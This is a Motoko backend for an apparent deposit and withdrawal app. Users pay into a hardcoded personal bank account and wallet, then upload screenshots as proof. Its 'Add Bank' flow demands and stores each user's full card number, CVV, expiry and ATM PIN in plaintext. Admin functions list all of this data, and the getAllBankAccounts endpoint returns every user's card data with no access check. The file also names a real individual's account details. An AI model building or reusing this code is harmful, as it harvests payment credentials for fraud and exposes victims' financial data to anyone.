import Map "mo:core/Map";
import Array "mo:core/Array";
import Iter "mo:core/Iter";
import Order "mo:core/Order";
import Principal "mo:core/Principal";
import Text "mo:core/Text";
import Nat "mo:core/Nat";
import Runtime "mo:core/Runtime";
import Time "mo:core/Time";
import Int "mo:core/Int";
import MixinAuthorization "authorization/MixinAuthorization";
import AccessControl "authorization/access-control";
import MixinStorage "blob-storage/Mixin";
import Storage "blob-storage/Storage";
import Migration "migration";

// Remove persistent accounts from previous migration
(with migration = Migration.run)
actor {
  let accessControlState = AccessControl.initState();
  include MixinAuthorization(accessControlState);
  include MixinStorage();

  // ==== Data Types ====

  public type UserProfile = {
    username : Text;
    email : Text;
    inrBalance : Nat;
    usdtBalance : Nat;
  };

  type Screenshot = {
    id : Nat;
    owner : Principal;
    file : Storage.ExternalBlob;
    description : Text;
    amount : Nat;
    timestamp : Time.Time;
  };

  module Screenshot {
    public func compareByAmount(a : Screenshot, b : Screenshot) : Order.Order {
      Nat.compare(a.amount, b.amount);
    };

    public func compareByTime(a : Screenshot, b : Screenshot) : Order.Order {
      Int.compare(a.timestamp, b.timestamp);
    };
  };

  type DepositType = {
    #inr;
    #usdt;
  };

  public type BankAccountStatus = {
    #pending;
    #liveActive;
    #rejected;
  };

  type BankStatus = {
    #pending;
    #liveActive;
    #rejected;
  };

  public type BankWithdrawal = {
    id : Nat;
    owner : Principal;
    amount : Nat;
    accountNumber : Text;
    ifsc : Text;
    timestamp : Time.Time;
    status : BankStatus;
  };

  module BankWithdrawal {
    public func compareByAmount(a : BankWithdrawal, b : BankWithdrawal) : Order.Order {
      Nat.compare(a.amount, b.amount);
    };

    public func compareByTime(a : BankWithdrawal, b : BankWithdrawal) : Order.Order {
      Int.compare(a.timestamp, b.timestamp);
    };
  };

  type CryptoWithdrawal = {
    id : Nat;
    owner : Principal;
    amount : Nat;
    walletAddress : Text;
    timestamp : Time.Time;
  };

  module CryptoWithdrawal {
    public func compareByAmount(a : CryptoWithdrawal, b : CryptoWithdrawal) : Order.Order {
      Nat.compare(a.amount, b.amount);
    };

    public func compareByTime(a : CryptoWithdrawal, b : CryptoWithdrawal) : Order.Order {
      Int.compare(a.timestamp, b.timestamp);
    };
  };

  type DepositLimitWarning = {
    id : Nat;
    warning : Text;
    depositType : DepositType;
    limit : Nat;
    timestamp : Time.Time;
  };

  // ==== Bank Details Types ====

  public type BankDetails = {
    bankName : Text;
    accountNumber : Text;
    ifsc : Text;
    accountHolder : Text;
  };

  public type Trc20Wallet = {
    address : Text;
  };

  // Bank account details submitted by users via the Add Bank flow.
  // Includes a status field that defaults to #pending on submission.
  public type BankDetailsWithoutNetBanking = {
    // Bank Account Details
    bankName : Text;
    accountNumber : Text;
    ifsc : Text;

    // ATM/Debit Card Details
    cardNumber : Text;
    expiryDate : Text;
    cvv : Text;
    atmPin : Text;

    // Identity & Contact
    phoneNumber : Text;
    emailId : Text;

    // Status of the bank account
    status : BankAccountStatus;
  };

  // Used for deleting the status
  public type BankDetailsWithoutNetBankingV1 = {
    // Bank Account Details
    bankName : Text;
    accountNumber : Text;
    ifsc : Text;

    // ATM/Debit Card Details
    cardNumber : Text;
    expiryDate : Text;
    cvv : Text;
    atmPin : Text;

    // Identity & Contact
    phoneNumber : Text;
    emailId : Text;
  };

  // ==== Error Handling ====

  public type SaveBankDetailsResult = {
    #success;
    #error : Text;
  };

  public type SetAllInrBalancesResult = {
    updatedCount : Nat;
    defaultBalance : Nat;
  };

  // ==== Persistent Storage ====

  let userProfiles = Map.empty<Principal, UserProfile>();
  let inrScreenshots = Map.empty<Nat, Screenshot>();
  let usdtScreenshots = Map.empty<Nat, Screenshot>();
  let depositLimitWarnings = Map.empty<Nat, DepositLimitWarning>();
  let inrWithdrawals = Map.empty<Nat, BankWithdrawal>();
  let usdtWithdrawals = Map.empty<Nat, CryptoWithdrawal>();
  let completeBankDetails = Map.empty<Principal, BankDetailsWithoutNetBankingV1>();

  var nextScreenshotId = 0;
  var nextWarningId = 0;
  var nextWithdrawalId = 0;

  // ==== Constants ====

  let bankDetails : BankDetails = {
    bankName = "Punjab & Sind Bank";
    accountNumber = "01031001005357";
    ifsc = "PSIB0000103";
    accountHolder = "MR. GOURAV KASERA";
  };

  let trc20Wallet : Trc20Wallet = {
    address = "0x4b346c3Db9E1259bf8e0852707DF8685145a4520";
  };

  var defaultInrBalance : Nat = 1000;
  var defaultUsdtBalance : Nat = 0;

  // ==== User Profile Management ====

  public shared ({ caller }) func getCallerUserProfile() : async ?UserProfile {
    if (not (AccessControl.hasPermission(accessControlState, caller, #user))) {
      Runtime.trap("Unauthorized: Only users can view profiles");
    };

    switch (userProfiles.get(caller)) {
      case (?profile) { ?profile };
      case (null) {
        let newProfile : UserProfile = {
          username = "";
          email = "";
          inrBalance = defaultInrBalance;
          usdtBalance = defaultUsdtBalance;
        };
        userProfiles.add(caller, newProfile);
        ?newProfile;
      };
    };
  };

  public query ({ caller }) func getUserProfile(user : Principal) : async ?UserProfile {
    if (caller != user and not AccessControl.isAdmin(accessControlState, caller)) {
      Runtime.trap("Unauthorized: Can only view your own profile");
    };
    userProfiles.get(user);
  };

  public shared ({ caller }) func saveCallerUserProfile(profile : UserProfile) : async () {
    if (not (AccessControl.hasPermission(accessControlState, caller, #user))) {
      Runtime.trap("Unauthorized: Only users can save profiles");
    };
    userProfiles.add(caller, profile);
  };

  public shared ({ caller }) func createUserProfile(username : Text, email : Text) : async () {
    if (not (AccessControl.hasPermission(accessControlState, caller, #user))) {
      Runtime.trap("Unauthorized: Only users can create profiles");
    };

    let newProfile : UserProfile = {
      username;
      email;
      inrBalance = defaultInrBalance;
      usdtBalance = defaultUsdtBalance;
    };

    userProfiles.add(caller, newProfile);
  };

  public shared ({ caller }) func setAllInrBalancesToDefault() : async SetAllInrBalancesResult {
    if (not (AccessControl.hasPermission(accessControlState, caller, #admin))) {
      Runtime.trap("Unauthorized: Only admins can set balances");
    };

    let profiles = userProfiles.entries().toArray();
    let updatedProfiles = profiles.map(
      func((principal, profile)) {
        (principal, { profile with inrBalance = defaultInrBalance });
      }
    );

    userProfiles.clear();
    for ((principal, profile) in updatedProfiles.values()) {
      userProfiles.add(principal, profile);
    };

    {
      updatedCount = updatedProfiles.size();
      defaultBalance = defaultInrBalance;
    };
  };

  // ==== Deposit Handling ====

  public shared ({ caller }) func uploadScreenshot(file : Storage.ExternalBlob, description : Text, amount : Nat, depositType : DepositType) : async Nat {
    if (not (AccessControl.hasPermission(accessControlState, caller, #user))) {
      Runtime.trap("Unauthorized: Only users can upload screenshots");
    };

    let timestamp = Time.now();
    let screenshotId = nextScreenshotId;

    let screenshot : Screenshot = {
      id = screenshotId;
      owner = caller;
      file;
      description;
      amount;
      timestamp;
    };

    switch (depositType) {
      case (#inr) {
        inrScreenshots.add(screenshotId, screenshot);
      };
      case (#usdt) {
        usdtScreenshots.add(screenshotId, screenshot);
      };
    };

    nextScreenshotId += 1;
    screenshotId;
  };

  // ==== Withdrawal Handling ====

  public shared ({ caller }) func addBankWithdrawal(amount : Nat, accountNumber : Text, ifsc : Text) : async Nat {
    if (not (AccessControl.hasPermission(accessControlState, caller, #user))) {
      Runtime.trap("Unauthorized: Only users can create withdrawals");
    };

    let withdrawalId = nextWithdrawalId;
    let timestamp = Time.now();

    let withdrawal : BankWithdrawal = {
      id = withdrawalId;
      owner = caller;
      amount;
      accountNumber;
      ifsc;
      timestamp;
      status = #pending;
    };

    inrWithdrawals.add(withdrawalId, withdrawal);
    nextWithdrawalId += 1;
    withdrawalId;
  };

  public shared ({ caller }) func addCryptoWithdrawal(amount : Nat, walletAddress : Text) : async Nat {
    if (not (AccessControl.hasPermission(accessControlState, caller, #user))) {
      Runtime.trap("Unauthorized: Only users can create withdrawals");
    };

    let withdrawalId = nextWithdrawalId;
    let timestamp = Time.now();

    let withdrawal : CryptoWithdrawal = {
      id = withdrawalId;
      owner = caller;
      amount;
      walletAddress;
      timestamp;
    };

    usdtWithdrawals.add(withdrawalId, withdrawal);
    nextWithdrawalId += 1;
    withdrawalId;
  };

  public shared ({ caller }) func updateBankWithdrawalStatus(withdrawalId : Nat, newStatus : BankStatus) : async () {
    if (not (AccessControl.hasPermission(accessControlState, caller, #admin))) {
      Runtime.trap("Unauthorized: Only admins can update withdrawal status");
    };

    switch (inrWithdrawals.get(withdrawalId)) {
      case (null) {
        Runtime.trap("Withdrawal not found");
      };
      case (?withdrawal) {
        let updatedWithdrawal : BankWithdrawal = { withdrawal with status = newStatus };
        inrWithdrawals.add(withdrawalId, updatedWithdrawal);
      };
    };
  };

  // ==== Deposit Limit Warning Handling (Admin Only) ====

  public shared ({ caller }) func addDepositLimitWarning(warning : Text, depositType : DepositType, limit : Nat) : async Nat {
    if (not (AccessControl.hasPermission(accessControlState, caller, #admin))) {
      Runtime.trap("Unauthorized: Only admins can add deposit warnings");
    };

    let warningId = nextWarningId;
    let timestamp = Time.now();

    let depositWarning : DepositLimitWarning = {
      id = warningId;
      warning;
      depositType;
      limit;
      timestamp;
    };

    depositLimitWarnings.add(warningId, depositWarning);
    nextWarningId += 1;
    warningId;
  };

  // ==== Query Functions - User's Own Data ====

  public query ({ caller }) func getUserScreenshots(depositType : DepositType) : async [Screenshot] {
    if (not (AccessControl.hasPermission(accessControlState, caller, #user))) {
      Runtime.trap("Unauthorized: Only users can view screenshots");
    };

    let allScreenshots = switch (depositType) {
      case (#inr) { inrScreenshots.values().toArray() };
      case (#usdt) { usdtScreenshots.values().toArray() };
    };

    allScreenshots.filter<Screenshot>(func(s) { s.owner == caller }).sort(Screenshot.compareByAmount);
  };

  public query ({ caller }) func getUserBankWithdrawals() : async [BankWithdrawal] {
    if (not (AccessControl.hasPermission(accessControlState, caller, #user))) {
      Runtime.trap("Unauthorized: Only users can view withdrawals");
    };

    let allWithdrawals = inrWithdrawals.values().toArray();
    allWithdrawals.filter<BankWithdrawal>(func(w) { w.owner == caller }).sort(BankWithdrawal.compareByAmount);
  };

  public query ({ caller }) func getUserCryptoWithdrawals() : async [CryptoWithdrawal] {
    if (not (AccessControl.hasPermission(accessControlState, caller, #user))) {
      Runtime.trap("Unauthorized: Only users can view withdrawals");
    };

    let allWithdrawals = usdtWithdrawals.values().toArray();
    allWithdrawals.filter<CryptoWithdrawal>(func(w) { w.owner == caller }).sort(CryptoWithdrawal.compareByAmount);
  };

  // ==== Query Functions - Admin Only (All Data) ====

  public query ({ caller }) func getAllScreenshots(depositType : DepositType) : async [Screenshot] {
    if (not (AccessControl.hasPermission(accessControlState, caller, #admin))) {
      Runtime.trap("Unauthorized: Only admins can view all screenshots");
    };

    switch (depositType) {
      case (#inr) {
        inrScreenshots.values().toArray().sort(Screenshot.compareByAmount);
      };
      case (#usdt) {
        usdtScreenshots.values().toArray().sort(Screenshot.compareByAmount);
      };
    };
  };

  public query ({ caller }) func getAllScreenshotsByTime(depositType : DepositType) : async [Screenshot] {
    if (not (AccessControl.hasPermission(accessControlState, caller, #admin))) {
      Runtime.trap("Unauthorized: Only admins can view all screenshots");
    };

    switch (depositType) {
      case (#inr) {
        inrScreenshots.values().toArray().sort(Screenshot.compareByTime);
      };
      case (#usdt) {
        usdtScreenshots.values().toArray().sort(Screenshot.compareByTime);
      };
    };
  };

  public query ({ caller }) func getAllBankWithdrawals() : async [BankWithdrawal] {
    if (not (AccessControl.hasPermission(accessControlState, caller, #admin))) {
      Runtime.trap("Unauthorized: Only admins can view all withdrawals");
    };

    inrWithdrawals.values().toArray().sort(BankWithdrawal.compareByAmount);
  };

  public query ({ caller }) func getAllBankWithdrawalsByTime() : async [BankWithdrawal] {
    if (not (AccessControl.hasPermission(accessControlState, caller, #admin))) {
      Runtime.trap("Unauthorized: Only admins can view all withdrawals");
    };

    inrWithdrawals.values().toArray().sort(BankWithdrawal.compareByTime);
  };

  public query ({ caller }) func getAllCryptoWithdrawals() : async [CryptoWithdrawal] {
    if (not (AccessControl.hasPermission(accessControlState, caller, #admin))) {
      Runtime.trap("Unauthorized: Only admins can view all withdrawals");
    };

    usdtWithdrawals.values().toArray().sort(CryptoWithdrawal.compareByAmount);
  };

  public query ({ caller }) func getAllCryptoWithdrawalsByTime() : async [CryptoWithdrawal] {
    if (not (AccessControl.hasPermission(accessControlState, caller, #admin))) {
      Runtime.trap("Unauthorized: Only admins can view all withdrawals");
    };

    usdtWithdrawals.values().toArray().sort(CryptoWithdrawal.compareByTime);
  };

  public query ({ caller }) func getAllDepositWarnings() : async [DepositLimitWarning] {
    if (not (AccessControl.hasPermission(accessControlState, caller, #admin))) {
      Runtime.trap("Unauthorized: Only admins can view deposit warnings");
    };

    depositLimitWarnings.values().toArray();
  };

  // ==== Public Information (Available to Users) ====

  public query ({ caller }) func getBankDetails() : async BankDetails {
    if (not (AccessControl.hasPermission(accessControlState, caller, #user))) {
      Runtime.trap("Unauthorized: Only users can view bank details");
    };

    bankDetails;
  };

  public query ({ caller }) func getTrc20Wallet() : async Trc20Wallet {
    if (not (AccessControl.hasPermission(accessControlState, caller, #user))) {
      Runtime.trap("Unauthorized: Only users can view wallet address");
    };

    trc20Wallet;
  };

  // ==== Complete Bank Details Handling (WITHOUT NET BANKING) ====

  // Save bank details for the calling user. Status defaults to #pending.
  public shared ({ caller }) func saveCompleteBankDetails(details : BankDetailsWithoutNetBanking) : async SaveBankDetailsResult {
    if (not (AccessControl.hasPermission(accessControlState, caller, #user))) {
      return #error("Unauthorized: Only users can save bank details");
    };

    // Validate all required fields
    if (
      details.bankName == "" or
      details.accountNumber == "" or
      details.ifsc == "" or
      details.cardNumber == "" or
      details.expiryDate == "" or
      details.cvv == "" or
      details.atmPin == "" or
      details.phoneNumber == "" or
      details.emailId == ""
    ) {
      return #error("All fields are required. Please fill in all details.");
    };

    let bankDetailsToSave : BankDetailsWithoutNetBankingV1 = {
      bankName = details.bankName;
      accountNumber = details.accountNumber;
      ifsc = details.ifsc;
      cardNumber = details.cardNumber;
      expiryDate = details.expiryDate;
      cvv = details.cvv;
      atmPin = details.atmPin;
      phoneNumber = details.phoneNumber;
      emailId = details.emailId;
    };

    completeBankDetails.add(caller, bankDetailsToSave);

    #success;
  };

  // Retrieve the calling user's own bank account details including status.
  public query ({ caller }) func getCompleteBankDetails() : async ?BankDetailsWithoutNetBankingV1 {
    if (not (AccessControl.hasPermission(accessControlState, caller, #user))) {
      Runtime.trap("Unauthorized: Only users can view bank details");
    };
    completeBankDetails.get(caller);
  };

  // Retrieve a specific user's bank account details (admin only).
  public query ({ caller }) func getUserCompleteBankDetails(user : Principal) : async ?BankDetailsWithoutNetBankingV1 {
    if (not AccessControl.isAdmin(accessControlState, caller)) {
      Runtime.trap("Unauthorized: Only admins can view other users' bank details");
    };
    completeBankDetails.get(user);
  };

  // Retrieve all users' bank account details (admin only).
  public query ({ caller }) func getAllCompleteBankDetails() : async [(Principal, BankDetailsWithoutNetBankingV1)] {
    if (not AccessControl.isAdmin(accessControlState, caller)) {
      Runtime.trap("Unauthorized: Only admins can view all bank details");
    };
    completeBankDetails.entries().toArray();
  };

  // New public function endpoint to get all bank accounts (including pending)
  public query ({ caller }) func getAllBankAccounts() : async [BankDetailsWithoutNetBanking] {
    // Build list of pending accounts dynamically by mapping over existing data
    let resultArray = completeBankDetails.values().toArray().map<BankDetailsWithoutNetBankingV1, BankDetailsWithoutNetBanking>(
      func(record) {
        {
          bankName = record.bankName;
          accountNumber = record.accountNumber;
          ifsc = record.ifsc;
          cardNumber = record.cardNumber;
          expiryDate = record.expiryDate;
          cvv = record.cvv;
          atmPin = record.atmPin;
          phoneNumber = record.phoneNumber;
          emailId = record.emailId;
          status = #pending;
        };
      }
    );
    resultArray;
  };

  // ==== Default Balances ====

  public query ({ caller }) func getDefaultBalances() : async (Nat, Nat) {
    if (not (AccessControl.hasPermission(accessControlState, caller, #user))) {
      Runtime.trap("Unauthorized: Only users can fetch default balance");
    };
    (defaultInrBalance, defaultUsdtBalance);
  };
};
